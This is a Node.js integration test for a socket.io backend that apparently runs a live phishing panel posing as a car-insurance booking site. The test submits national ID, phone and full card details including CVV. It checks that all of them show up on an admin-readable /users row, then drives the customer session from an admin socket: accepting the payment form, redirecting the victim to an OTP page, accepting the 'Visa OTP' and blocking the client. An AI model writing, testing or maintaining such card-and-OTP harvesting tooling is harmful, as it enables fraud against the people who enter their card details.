#!/usr/bin/env node
/**
 * Integration test: submits sample data, verifies field flattening, then uses a
 * second admin socket to verify dashboard actions reach the customer contract.
 *
 * Usage:
 *   node scripts/integration-test.mjs [baseUrl]
 * Env:
 *   BACKEND_URL    backend base url (default: Railway production)
 *   ADMIN_TOKEN    optional, used when /users is protected
 *   SITE_ORIGIN    origin header sent with requests
 */
import { io } from "socket.io-client";

const BASE =
  process.argv[2] ||
  process.env.BACKEND_URL ||
  "https://jbackend-production-dc1b.up.railway.app";
const ORIGIN = process.env.SITE_ORIGIN || "https://gosuksa-tmin.lovable.app";
const ADMIN_TOKEN = process.env.ADMIN_TOKEN || "";

const stamp = Date.now().toString().slice(-6);
const booking = {
  nationalIdIqama: `1${stamp}0000`,
  documentOwnerName: `IT Owner ${stamp}`,
  phoneNumber: `05${stamp}00`,
  sequenceNumber: `SEQ${stamp}`,
  compname: `IT-CO-${stamp}`,
  totalPrice: "1234",
  TypeOfInsuranceContract: "شامل",
  carValue: "55000",
  vehicle: { make: "TOYOTA", model: "CAMRY", year: "2021", plateNumber: `P${stamp}` },
};
const payment = {
  paymentMethod: "card",
  cardNumber: "4111111111111111",
  cardholderName: `IT Card ${stamp}`,
  cvv: "123",
  expiry: "12/28",
  amount: "1234",
};

const expected = {
  idNumber: booking.nationalIdIqama,
  name: booking.documentOwnerName,
  phone: booking.phoneNumber,
  sequenceNumber: booking.sequenceNumber,
  company: booking.compname,
  price: booking.totalPrice,
  insuranceType: booking.TypeOfInsuranceContract,
  carValue: booking.carValue,
  carMake: booking.vehicle.make,
  carModel: booking.vehicle.model,
  carYear: booking.vehicle.year,
  plateNumber: booking.vehicle.plateNumber,
  paymentMethod: payment.paymentMethod,
  cardNumber: payment.cardNumber,
  cardholderName: payment.cardholderName,
  cardCvv: payment.cvv,
  cardExpiry: payment.expiry,
};

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const headers = { Origin: ORIGIN, ...(ADMIN_TOKEN ? { Authorization: `Bearer ${ADMIN_TOKEN}` } : {}) };

function fail(msg) {
  console.error(`\n✗ ${msg}`);
  process.exit(1);
}

const version = await fetch(`${BASE}/version`, { headers })
  .then((r) => r.json())
  .catch(() => null);
if (!version) fail(`backend not reachable at ${BASE}`);
console.log(`backend ${BASE} version=${version.version} persistent=${version.persistent}`);

const socket = io(BASE, { transports: ["websocket"], extraHeaders: { Origin: ORIGIN } });
const events = [];
for (const e of ["live:update", "form:submitted"]) socket.on(e, () => events.push(e));
const relayed = [];
for (const e of ["payment:action", "admin:redirect", "user:blocked", "otp:action"])
  socket.on(e, (payload) => relayed.push({ event: e, payload }));

const uuid = await new Promise((resolve, reject) => {
  const t = setTimeout(() => reject(new Error("timed out waiting for user:uuidAssigned")), 20000);
  socket.on("connect", () => socket.emit("user:join", {}));
  socket.on("user:uuidAssigned", (d) => {
    clearTimeout(t);
    resolve(d?.uuid || d);
  });
  socket.on("connect_error", (e) => {
    clearTimeout(t);
    reject(e);
  });
}).catch((e) => fail(e.message));
console.log(`session uuid=${uuid}`);

socket.emit("booking:update", { uuid, formData: booking });
await sleep(1500);
socket.emit("payment:update", { uuid, formData: payment });
await sleep(3000);

const res = await fetch(`${BASE}/users`, { headers });
if (!res.ok) fail(`GET /users -> ${res.status}`);
const body = await res.json();
const rows = Array.isArray(body) ? body : body.users || [];
const row = rows.find((u) => (u.uuid || u.id) === uuid);
if (!row) fail(`no /users row found for uuid ${uuid}`);

const missing = [];
for (const [k, v] of Object.entries(expected)) {
  const ok = String(row[k] ?? "") === String(v);
  console.log(`${ok ? "✓" : "✗"} ${k.padEnd(16)} ${ok ? row[k] : `expected "${v}", got "${row[k] ?? ""}"`}`);
  if (!ok) missing.push(k);
}
console.log(`realtime events observed: ${[...new Set(events)].join(", ") || "none"}`);

if (missing.length) fail(`${missing.length} field(s) not flattened: ${missing.join(", ")}`);
console.log(`\n✓ all ${Object.keys(expected).length} fields flattened onto the /users row`);

const admin = io(BASE, {
  transports: ["websocket"],
  auth: ADMIN_TOKEN ? { token: ADMIN_TOKEN } : {},
  extraHeaders: { Origin: ORIGIN },
});
await new Promise((resolve, reject) => {
  const timer = setTimeout(() => reject(new Error("admin socket connection timed out")), 20000);
  admin.once("connect", () => {
    clearTimeout(timer);
    admin.emit("join", { role: "admin", ...(ADMIN_TOKEN ? { token: ADMIN_TOKEN } : {}) });
    resolve();
  });
  admin.once("connect_error", reject);
}).catch((e) => fail(e.message));

for (const [event, payload] of [
  ["acceptPaymentForm", { sessionId: uuid, token: ADMIN_TOKEN }],
  ["adminRedirect", { sessionId: uuid, path: "/otp", token: ADMIN_TOKEN }],
  ["acceptVisaOtp", { targetUserId: uuid }],
  ["clientBlocked", { userId: uuid, message: "blocked" }],
]) {
  await new Promise((resolve) =>
    admin.timeout(5000).emit(event, payload, (error, response) => {
      if (error || !response?.ok) fail(`${event} was not acknowledged`);
      resolve();
    }),
  );
}
await sleep(1000);

const expectedRelay = {
  "payment:action": "confirmed",
  "admin:redirect": null,
  "user:blocked": null,
  "otp:action": "confirmed",
};
for (const [event, action] of Object.entries(expectedRelay)) {
  const matches = relayed.filter(
    (entry) => entry.event === event && (!action || entry.payload?.action === action),
  );
  if (matches.length !== 1) fail(`${event} relay count=${matches.length}, expected 1`);
  if (event === "admin:redirect" && matches[0]?.payload?.page !== "/otp")
    fail(`admin:redirect page=${matches[0]?.payload?.page}, expected /otp`);
  console.log(`✓ ${event} relayed once to customer`);
}

admin.close();
socket.close();
